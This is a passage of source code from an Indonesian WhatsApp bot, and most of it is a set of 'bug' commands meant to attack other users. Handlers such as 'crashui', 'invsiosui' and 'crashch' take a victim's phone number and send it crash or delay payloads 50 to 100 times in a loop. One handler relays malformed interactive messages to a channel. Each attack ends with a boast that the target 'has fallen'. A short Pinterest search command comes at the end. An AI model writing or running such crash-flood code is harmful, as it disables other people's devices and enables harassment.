        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case 'invsdlymedium': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYMEDIUM 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝗗𝗘𝗟𝗔𝗬 𝗜𝗡𝗩𝗜𝗦 𝗠𝗘𝗗𝗜𝗨𝗠'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗𝟲ᯭ͢𝟖᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYMEDIUM 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await prokontol(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case 'invsdlyeasy': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYEASY 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝗗𝗘𝗟𝗔𝗬 𝗜𝗡𝗩𝗜𝗦 𝗘𝗔𝗦𝗬'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗𝟲ᯭ͢𝟖᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYEASY 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 50; r++) {
        await prokontol(target)
        await bulldozer(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case 'invsiosui': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSIOSUI 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐈𝐎𝐒 𝐔𝐈'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗ᯭ͢𝟲᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSIOSUI 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await IosInvisibleui(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case 'invsiosui2': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSIOSUI2 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐈𝐎𝐒 𝐔𝐈 𝟮'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗ᯭ𝟲͢𝟮᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSIOSUI2 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await IosInvisibleui(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case 'crashui2': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .CRASHUI2 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝐂𝐑𝐀𝐒𝐇 𝐔𝐈 𝟮'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗ᯭ𝟮͢͢𝟮͢𝟖᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .CRASHUI2 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await OblNotif(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case 'crashui3': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .CRASHUI3 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝐂𝐑𝐀𝐒𝐇 𝐔𝐈 𝟑'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗ᯭ𝟲͢͢𝟲͢𝟖᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .CRASHUI3 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await OblNotif(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case 'crashui': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .CRASHUI 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝐂𝐑𝐀𝐒𝐇 𝐔𝐈'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗ᯭ𝟲͢͢𝟮͢𝟖᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .CRASHUI 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await OblNotif(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case "crashch": {
    if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .CRASHCH 𝟲𝟮𝗫𝗫`);
    
      const virusNames = {
    'combox': '𝐂𝐑𝐀𝐒𝐇 𝐓𝐎 𝐂𝐇𝐀𝐍𝐍𝐄𝐋'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗𝟖ᯭ͢𝟖᭄'
  };
    
    let incTarget = q.replace(/[^0-9@.a-zA-Z]/g, "");
    if (!incTarget.includes("@")) reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .CRASHCH 𝟲𝟮𝗫𝗫`);
  
   await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗖𝗵𝗮𝗻𝗻𝗲𝗹\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let i = 0; i < 10; i++) {
        const msg = generateWAMessageFromContent(idChannel, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "peler"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
                                {
                                    name: "review_order",
                                    buttonParamsJson: "vokep"
                                },
                            ],
                        }
                    }
                }
            }
        }, { ephemeralExpiration: 999999, timeStamp: Date.now() });

        await zuu.relayMessage(incTarget, msg.message, { messageId: msg.key.id });
    }

    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break;
case 'kak':
case 'dek':
case 'halo':
case 'p':
case 'cuy': {
  if (!isCreator) return reply(mess.owner);
  let virusNames = {
    'kak': '𝐗 𝐃𝐄𝐋𝐀𝐘 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄',
    'dek': '𝐗 𝐃𝐄𝐋𝐀𝐘 𝐁𝐑𝐄𝐀𝐊𝐄𝐑',
    'halo': '𝐗 𝐃𝐄𝐋𝐀𝐘 𝐇𝐀𝐑𝐃', 
    'p': '𝐗 𝐃𝐄𝐋𝐀𝐘 𝐕𝐎𝐈𝐃',    
    'cuy': '𝐗 𝐃𝐄𝐋𝐀𝐘 𝐃𝐄𝐕𝐈𝐂𝐄'
  };

  let angkanya = {
    'kak': '99999999',
    'dek': '88888888',
    'halo': '99999999',
    'p': '55555555',
    'cuy': '44444444',
  };
  await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`)

for (let r = 0; r < 100; r++) {
        await prokontol(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`
\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break;
                
//===== SEARCH ====== //
            case "pin":
            case "pintesert": {
                if (!text) return reply("Masukan Query")
                async function createImage(url) {
                    try {
                        const {
                            imageMessage
                        } = await generateWAMessageContent({
                            image: {
                                url
                            }
                        }, {
                            upload: zuu.waUploadToServer
                        });
                        return imageMessage;
                    } catch (error) {
                        console.error(error);
                        return null;
                    }
                }
                async function sendPinterestImages(text, m) {
                    try {
                        let push = [];
                        let {
                            data
                        } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
                        let res = data.resource_response.data.results.map(v => v.images.orig.url);
                        shuffleArray(res);
                        let ult = res.splice(0, 5);
                        let i = 1;
                        for (let lucuy of ult) {
                            const imageMessage = await createImage(lucuy);
                            if (imageMessage) {
                                push.push({
                                    body: proto.Message.InteractiveMessage.Body.fromObject({
                                        text: `Image ke - ${i++}`
                                    }),
                                    footer: proto.Message.InteractiveMessage.Footer.fromObject({
                                        text: ""
                                    }),
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: 'Hasil.',
                                        hasMediaAttachment: true,
                                        imageMessage: imageMessage
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            "name": "cta_url",
                                            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
                                        }]
                                    })
                                });
                            }
                        }

                        const bot = generateWAMessageFromContent(m.chat, {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {},
                                        deviceListMetadataVersion: 2
                                    },
